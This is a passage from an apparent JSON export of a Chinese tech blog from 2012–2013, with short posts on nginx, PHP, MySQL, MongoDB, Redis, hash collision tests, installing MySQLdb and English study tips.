id=\"sec-4\">备注</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n这个问题应该是由于之前glibc升级时未全部完成引起的，archlinux现在把/lib改为/usr/lib的软链接了，可以手工进行设置为软链接这一步骤来修复。</p>\n</div>\n</div>\n"
},
{
  "title": "Fnv算法冲突率测试",
  "timestamp": "2012-11-24 18:31:00",
  "tags": [
    "hash"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"http://www.isthe.com/chongo/tech/comp/fnv/\">Fnv</a>介绍</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\nFnv是和 <a href=\"http://code.google.com/p/cityhash/\">CityHash</a> 类似的哈希算法。这里重复《<a href=\"http://blog.kankanan.com/posts/2012/11/24_cityhash7b976cd551b27a8173876d4b8bd5.html\">CityHash算法冲突率测试</a>》，做为一个对比。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">测试样本数据</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">fnv64测试结果</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n没有冲突\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">fnv32测试结果</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n共31948次冲突，冲突率约为千分之二。\n同一哈希值上33次冲突二次，31879次冲突一次。\n冲突率比CityHash略低，少了298次。</p>\n</div>\n</div>\n"
},
{
  "title": "如何做面试",
  "timestamp": "2012-10-24 14:23:00",
  "tags": null,
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">语言基础</h2>\n</div>\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">相关技术</h2>\n</div>\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">性能优化</h2>\n</div>\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">架构</h2>\n</div>\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">管理</h2>\n</div>\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">诉求</h2>\n</div>\n"
},
{
  "title": "理解nginx的keepalive_timeout配置项",
  "timestamp": "2012-11-12 17:05:00",
  "tags": [
    "nginx",
    "http"
  ],
  "body": "<p>\n不要误以为它是指tcp连接空闲多少秒后关闭，它仅表示连接建立多少秒后关闭，不会在一次请求后重新计时。</p>\n"
},
{
  "title": "在python中安装mysqldb模块",
  "timestamp": "2012-08-01 08:55:00",
  "tags": [
    "python"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">正常的安装过程</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; background-color: #2d2d2d;\"> </span> wget <span style=\"color: #66cccc;\">\"http://downloads.sourceforge.net/project/mysql-python/mysql-python\\</span>\n<span style=\"color: #66cccc;\">/1.2.3/MySQL-python-1.2.3.tar.gz?r=http%3A%2F%2Fsourceforge.net%2Fprojects\\</span>\n<span style=\"color: #66cccc;\">%2Fmysql-python%2Ffiles%2F&amp;ts=1304062611&amp;use_mirror=nchc\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> tar xzvf MySQL-python-1.2.3.tar.gz\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #cc99cc;\">cd</span> MySQL-python-1.2.3\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> python setup.py build\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> python setup.py install\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">常见错误及其修复</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>ImportError: No module named setuptools\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\" id=\"install-setuptools\">wget http://pypi.python.org/packages/2.4/s/setuptools/setuptools-0.6c11-py2.4.eg<span style=\"text-decoration: underline;\">g</span><span style=\"color: #66cccc; text-decoration: underline;\">\\</span>\n<span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">md5=bd639f9b0eac4c42497034dec2ec0c2b</span>\nsh setuptools-0.6c11-py2.4.egg\n</pre>\n</div>\n</li>\n\n<li>mysql_config: command not found\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\" id=\"edit-site.cfg\">sed --in-place -e <span style=\"color: #66cccc;\">\"s/#mysql_config = \\/usr\\/local\\/bin\\/mysql_config/\\</span>\n<span style=\"color: #66cccc;\">mysql_config = \\/usr\\/local\\/mysql\\/bin\\/mysql_config/g\"</span> site.cfg\n</pre>\n</div>\n</li>\n\n<li>ImportError: &hellip; _mysql.so: undefined symbol: compress\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\" id=\"edit-setup_posix.py\">sed --in-place -e <span style=\"color: #66cccc;\">\"s/libs = mysql_config(\\\"libs_r\\\")/libs = mysql_config(\\\"libs_</span><span style=\"color: #66cccc; text-decoration: underline;\">r\\\")\\n\\</span>\n<span style=\"color: #66cccc;\">libs.append('-lz')\\n        print libs/g\"</span> setup_posix.py\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "如何学习英语",
  "timestamp": "2013-04-07 09:49:00",
  "tags": [
    "english"
  ],
  "body": "<p>\n经过一天的英孚及韦博试听，总结出以下几点：\n</p>\n<dl class=\"org-dl\">\n<dt> 语法 </dt><dd>    熟读常用句型，扩展至类似语句，从中提炼语法，另一方面也可以练就一口流利的日用口语。\n</dd>\n<dt> 听力 </dt><dd>    不会说就不会听，多说才能够快速识别听到的东西。\n</dd>\n<dt> 阅读 </dt><dd>    多记单词，不断的重复重复再重复，直到看到单词脱口而出。\n</dd>\n</dl>\n"
},
{
  "title": "MongoDB基础",
  "timestamp": "2012-10-21 17:06:00",
  "tags": [
    "mongodb"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">MongoDB与Mysql的基本结构对应关系</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n</div><div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">一台机器</h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<p>\ncomputer\n</p>\n</div>\n\n<div id=\"outline-container-sec-1-1-1\" class=\"outline-4\">\n<h4 id=\"sec-1-1-1\">多个MongoDB实例                                          &lt;&#x2013;对应&#x2013;&gt;                    mysql服务器进程</h4>\n<div class=\"outline-text-4\" id=\"text-1-1-1\">\n<p>\nMongoDB Instance                                        &lt;&#x2013;对应&#x2013;&gt;                    Mysqld Instance\n</p>\n\n<p>\n运行着的MongoDB后台服务进程：/etc/rc.d/mongodb start      &lt;&#x2013;对应&#x2013;&gt;                     /etc/rc.d/mysqld start\n</p>\n</div>\n\n<div id=\"outline-container-sec-1-1-1-1\" class=\"outline-5\">\n<h5 id=\"sec-1-1-1-1\">多个数据库                                              &lt;&#x2013;对应&#x2013;&gt;                    mysql中的数据库</h5>\n<div class=\"outline-text-5\" id=\"text-1-1-1-1\">\n<p>\nMongoDB Database                                       &lt;&#x2013;对应&#x2013;&gt;                     Database\n</p>\n</div>\n\n<div id=\"outline-container-sec-1-1-1-1-1\" class=\"outline-6\">\n<h6 id=\"sec-1-1-1-1-1\">多个集合                                               &lt;&#x2013;对应&#x2013;&gt;                    mysql中的表</h6>\n<div class=\"outline-text-6\" id=\"text-1-1-1-1-1\">\n<p>\nMongoDB Collection                                    &lt;&#x2013;对应&#x2013;&gt;                     Table\n</p>\n</div>\n\n<div id=\"outline-container-sec-1-1-1-1-1-1\" class=\"outline-7\">\n<h7 id=\"sec-1-1-1-1-1-1\">多个文档                                             &lt;&#x2013;对应&#x2013;&gt;                     mysql中的记录行</h7>\n<div class=\"outline-text-7\" id=\"text-1-1-1-1-1-1\">\n<p>\nMongoDB Document                                     &lt;&#x2013;对应&#x2013;&gt;                    Row\n</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">CentOS上搭建环境</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<dl class=\"org-dl\">\n<dt> 添加源/etc/yum.repos.d/10gen.repo </dt><dd><pre class=\"example\">\n[10gen]\nname=10gen Repository\nbaseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64\ngpgcheck=0\n</pre>\n</dd>\n<dt> 安装服务器客户端程序 </dt><dd><div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum install mongo-10gen mongo-10gen-server\n</pre>\n</div>\n</dd>\n<dt> 安装php扩展 </dt><dd><div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum -y install make gcc php-devel\nyum install php-pear\n<span style=\"color: #ffcc66;\">PATH</span>=$<span style=\"color: #ffcc66;\">PATH</span>:/usr/local/php/bin/ pecl install mongo\n</pre>\n</div>\n<p>\nphp.ini中添加：extension=mongo.so\n</p>\n</dd>\n<dt> 启动服务 </dt><dd>     /etc/rc.d/init.d/mongodb start\n</dd>\n</dl>\n</div>\n</div>\n"
},
{
  "title": "解决mysql_connect慢的问题",
  "timestamp": "2012-12-06 10:25:00",
  "tags": [
    "mysql"
  ],
  "body": "<p>\n压测时发现mysql_connect耗时超过30秒，登录mysql后执行show processlist，显示超过800个连接状态如下：\n</p>\n\n<pre class=\"example\">\nunauthenticated user | XXXX.XXX.XXX.XXX:XXXX  | NULL | Connect     |  NULL | login\n</pre>\n\n<p>\n经求教运维，在my.cnf中的“[mysqld]”下添加以下配置行即可：\n</p>\n\n<pre class=\"example\">\nskip-name-resolve\n</pre>\n"
},
{
  "title": "Nginx Comet: 基于 HTTP 长连接的“服务器推”技术",
  "timestamp": "2012-12-14 21:09:00",
  "tags": [
    "nginx",
    "comet"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">简介</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n可参考这篇文章：<a href=\"http://www.ibm.com/developerworks/cn/web/wa-lo-comet/\">Comet：基于 HTTP 长连接的“服务器推”技术</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https://github.com/slact/nginx_http_push_module\">nginx_http_push_module</a> （不建议使用）</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n这个模块功能上没有问题，网上介绍的文章相对比较多，但是存在严重的内存泄露问题，而且发现使用kill -HUP的方式优雅重启nginx虽会释放一部分内存，但nginx错误日志显示有共享内存锁相关的冲突，我们不得不每小时彻底重启一次nginx。简单说一下就是它使用一个全局的内存池来分配订阅者及响应需要的内存空间，但是从nginx内存池分配的小内存块（&lt; pagesize，4096）是不会释放的也不会归还到池中进行重用，具体可查看nginx源码的ngx_palloc和ngx_pfree函数进行验证。\n</p>\n\n<p>\n可google \"nginx中mod_push模块内存分配改造\"，在作者的<a href=\"http://http://blog.lifeibo.com/\">网站</a>正在改版暂时找不到该文章。\n</p>\n\n<p>\n<a href=\"http://bsd.ee/~hadara/blog/?p=215=1\">这里</a>也有人<a href=\"https://github.com/slact/nginx_http_push_module/pull/60\">指出</a>该问题，同时该文作者也fork了一个分枝，但是我试了一下，除了不支持push_channel_timeout特性外，还是一样有内存泄露。\n</p>\n\n<dl class=\"org-dl\">\n<dt> 参考配置 </dt><dd></dd>\n</dl>\n<pre class=\"example\">\nlocation ~ ^/publish$ {\n    allow 127.0.0.1;\n    deny all;\n    set $push_channel_id $arg_id;\n    push_publisher;\n    push_delete_oldest_received_message on;\n    push_message_timeout 5s;\n    #push_channel_timeout 60s;\n    push_store_messages off;\n}\n\nlocation ~ ^/activity$ {\n    if ($args ~ \"callback=(.+)\" ) {\n        rewrite ^/activity \"/activity_jsonp\" last;\n    }\n    push_subscriber;\n    push_subscriber_timeout 60s;\n    push_subscriber_concurrency first;\n    push_max_channel_subscribers 1;\n    set $push_channel_id $arg_id;\n    default_type application/json;\n}\n\nlocation ~ ^/activity_jsonp$ {\n    push_subscriber;\n    push_subscriber_timeout 60s;\n    push_subscriber_concurrency first;\n    push_max_channel_subscribers 1;\n    set $push_channel_id $arg_id;\n    default_type application/json;\n    echo_before_body $arg_callback \"(\";\n    echo_after_body \")\";\n}\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\"><a href=\"https://github.com/wandenberg/nginx-push-stream-module\">nginx-push-stream-module</a> （建议使用）</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n由于 <a href=\"https://github.com/slact/nginx_http_push_module\">nginx_http_push_module</a> 存在内存泄露问题，同时没有人进行正式的修复，我们决定尝试一下<a href=\"https://github.com/wandenberg/nginx-push-stream-module\">nginx-push-stream-module</a>，这个模块功能更强大同时文档更完整，看起来也更活跃。\n</p>\n\n<dl class=\"org-dl\">\n<dt> 优点 </dt><dd><ul class=\"org-ul\">\n<li>更成熟\n有内存消耗说明文档，便于决定共享内存容量配置。\n有统计功能。\n可对响应内容进行再处理。\n</li>\n<li>测试中未发现明显的内存泄露\n</li>\n<li>内置支持jsonp\n返回的jsonp是这样的格式callback([text])，可以通过修改ngx_http_push_stream_module_utils.h中定义的NGX_HTTP_PUSH_STREAM_CALLBACK_INIT_CHUNK和NGX_HTTP_PUSH_STREAM_CALLBACK_END_CHUNK去除多余的中括号。\n</li>\n</ul>\n</dd>\n\n<dt> 参考配置 </dt><dd></dd>\n</dl>\n<pre class=\"example\">\npush_stream_store_messages off;\npush_stream_max_subscribers_per_channel 1;\npush_stream_subscriber_connection_ttl 60s;\npush_stream_longpolling_connection_ttl 60s;\n\nserver {\n    listen 80;\n    server_name localhost 127.0.0.1;\n    \n    ...\n\n    location ~ ^/publish$ {\n        allow 127.0.0.1;\n        deny all;\n        push_stream_publisher admin;\n        set $push_stream_channel_id $arg_id;\n    }\n    \n    location ~ ^/activity$ {\n        push_stream_subscriber long-polling;\n        set $push_stream_channels_path $arg_id;\n        push_stream_content_type \"application/json\";\n        push_stream_message_template \"~text~\";\n    }\n\n    ...\n}\n</pre>\n</div>\n</div>\n"
},
{
  "title": "nginx下快速搭建php运行环境",
  "timestamp": "2012-08-11 21:09:00",
  "tags": [
    "nginx",
    "php"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">安装</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n</div><div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">安装nginx</h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<p>\nyaourt -S nginx\n</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-2\" class=\"outline-3\">\n<h3 id=\"sec-1-2\">安装php</h3>\n<div class=\"outline-text-3\" id=\"text-1-2\">\n<p>\nyaourt -S php\n</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-3\" class=\"outline-3\">\n<h3 id=\"sec-1-3\">安装php-fpm</h3>\n<div class=\"outline-text-3\" id=\"text-1-3\">\n<p>\nyaourt -S php-fpm\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">配置</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n</div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">配置nginx</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<ul class=\"org-ul\">\n<li>将nginx.conf中的以下部分：\n<pre class=\"example\">\n#location ~ \\.php$ {\n...\n#}\n</pre>\n</li>\n<li>修改为\n<pre class=\"example\">\nlocation ~ \\.php$ {\n   root           /usr/share/nginx/html;\n   fastcgi_pass   127.0.0.1:9000;\n   fastcgi_index  index.php;\n   fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;\n   include        fastcgi_params;\n}\n</pre>\n</li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">配置php</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n在open_basedir中添加：/usr/share/nginx/html\n</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">配置php-fpm.conf</h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<p>\n启用以下listen配置：\nlisten = 127.0.0.1:9000\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">运行</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>重启nginx\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo /etc/rc.d/nginx restart\n</pre>\n</div>\n</li>\n<li>启动php-fpm\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo php-fpm\n</pre>\n</div>\n</li>\n<li>然后在/usr/share/nginx/html目录中写php脚本即可。\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "php中DOMDocument类createElement和createTextNode的区别",
  "timestamp": "2012-09-27 19:05:00",
  "tags": [
    "php"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">DOMDocument::createElement</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>原型：DOMElement DOMDocument::createElement ( string $name [, string $value ] )\n\n<p>\n创建一个元素，其中第二个参数是可选的，不会对它进行转义。当value中包含特殊字符（如：&amp;）会出错。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">Domdocument::createTextNode</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>原型：DOMText DOMDocument::createTextNode ( string $content )\n\n<p>\n创建一个文本结点，会对其内容进行转义。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">典型示例：创建一个文本元素</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">element</span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">doc</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">createElement</span>(<span style=\"color: #66cccc;\">\"city\"</span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">node</span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">doc</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">createTextNode</span>(<span style=\"color: #66cccc;\">\"shenzhen\"</span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">element</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">appendChild</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">node</span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">doc</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">appendChild</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">element</span>);\n</pre>\n</div>\n<ul class=\"org-ul\">\n<li>对应的xml文档：\n</li>\n</ul>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-xml\">&lt;<span style=\"color: #f99157;\">city</span>&gt;shenzhen&lt;/<span style=\"color: #f99157;\">city</span>&gt;\n</pre>\n</div>\n</div>\n</div>\n"
},
{
  "title": "当php遇上redis",
  "timestamp": "2012-12-08 13:41:00",
  "tags": [
    "php",
    "redis"
  ],
  "body": "<p>\n在最近的项目中，我们需要在php中访问redis，我们选择了使用<a href=\"https://github.com/nicolasff/phpredis\">phpredis</a>库，下面是遇到的一些问题。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">redis持久连接不靠谱。</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n可以说这是php的通病了，不管是mysql、memcache还是redis，指望由php本身（包含php扩展）来实现持久连接都是行不通的。\n</p>\n\n<dl class=\"org-dl\">\n<dt> 为什么这么说呢？ </dt><dd>     首先，所谓的持久连接的实现不外乎在进程（php-fpm）内建一个连接池，当php需要连接时，先以ip+port等信息为key在池中查找，找到则直接返回已有连接没有则新建连接。而当一个请求执行结束时，不关闭连接，而是把连接归还到池中。\n\n<p>\n这样当php需要用到多个redis实例时（分库），因为一个php-fpm进程会持有每个redis实例的一个连接，所以需要“php-fpm进程数“*“redis实例数\"个redis连接，而对于每个redis服务器则有“php-fpm进程数“个客户端连接。\n</p>\n\n<p>\n举个例子：一个web应用开了1000个php-fpm进程，有10个redis实例，那么保持的redis连接数就为1000*10也就是10000，每个redis实例有1000个客户端连接。如果前端或redis再扩容所需要的连接就会以乘积方式增加。一个redis实例有php-fpm进程数个连接的情况下表现如何呢，这就要好好测一测了，反正是每连接一线程的mysql是直接堵死了。\n</p>\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">RedisArray不靠谱。</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\nRedisArray实现了一致性hash分布式，但是它在初始化的时候就会连接上每个实例，这在web应用中简直是胡闹，它对一致性hash实现得比较完善，结点失效、动态添加结点时重新hash都有处理，在万不得已进行水平扩容时，可能会用得上。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">需要自已关闭redis连接。</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\nRedis的析构函数没有关闭redis连接，这会导致redis网络负载过高，要确保脚本结束时关闭连接，最好是能够封装一下Redis类再使用。\n</p>\n\n<dl class=\"org-dl\">\n<dt> 示例封装 </dt><dd></dd>\n</dl>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#20998;&#24067;&#24335;Redis.</span>\n<span style=\"color: #99cc99;\">class</span> <span style=\"color: #6699cc;\">RedisShard</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#26500;&#36896;&#20989;&#25968;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">public</span> <span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">__construct</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shards</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">reinit</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shards</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#26512;&#26500;&#20989;&#25968;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#33050;&#26412;&#32467;&#26463;&#26102;&#65292;phpredis&#19981;&#20250;&#33258;&#21160;&#20851;&#38381;redis&#36830;&#25509;&#65292;&#36825;&#37324;&#28155;&#21152;&#33258;&#21160;&#20851;&#38381;&#36830;&#25509;&#25903;&#25345;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#21487;&#20197;&#36890;&#36807;&#25163;&#21160;unset&#26412;&#31867;&#23545;&#35937;&#24555;&#36895;&#37322;&#25918;&#36164;&#28304;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">public</span> <span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">__destruct</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #99cc99;\">isset</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">close</span>();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#37325;&#26032;&#21021;&#22987;&#21270;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">public</span> <span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">reinit</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shards</span>){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">index</span> = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shards</span> = <span style=\"color: #99cc99;\">array</span>();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">foreach</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shards</span> <span style=\"color: #99cc99;\">as</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shards</span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">index</span>] = explode(<span style=\"color: #66cccc;\">':'</span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>); <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">&#26684;&#24335;&#65306;host:port:db</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shards</span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">index</span>][<span style=\"color: #66cccc;\">'index'</span>] = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">index</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ++<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">index</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }<span style=\"color: #f99157; background-color: #515151;\">        